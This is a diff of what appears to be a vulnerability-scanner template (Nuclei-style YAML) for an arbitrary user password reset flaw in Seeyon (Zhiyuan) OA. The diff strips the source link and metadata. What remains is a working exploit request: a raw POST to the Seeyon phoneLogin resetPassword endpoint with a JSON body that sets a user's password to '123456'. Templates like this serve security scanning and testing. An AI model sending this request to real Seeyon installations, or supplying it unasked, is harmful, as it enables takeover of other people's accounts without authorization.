@@ -3,12 +3,8 @@ info:
   name: 致远 OA 任意用户密码重置
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdkawxyn7odi2kzp'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gdkawxyn7odi2kzp
-    fofa: 暂无
 http:
 - raw:
   - 'POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     {"loginName":"vdkjfhgigfsjd34rvsdj","password":"123456"}
